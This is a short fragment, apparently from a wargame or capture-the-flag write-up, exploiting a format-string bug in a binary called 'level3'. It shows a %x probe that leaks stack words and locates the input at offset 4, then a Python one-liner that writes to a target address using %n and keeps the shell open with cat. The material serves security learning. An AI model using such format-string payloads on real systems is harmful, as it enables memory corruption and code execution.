
```shell
./level3 
AAAA %x %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520
```

(python -c 'print("\x8c\x98\x04\x08%60x%4$n")'; cat) | ./level3
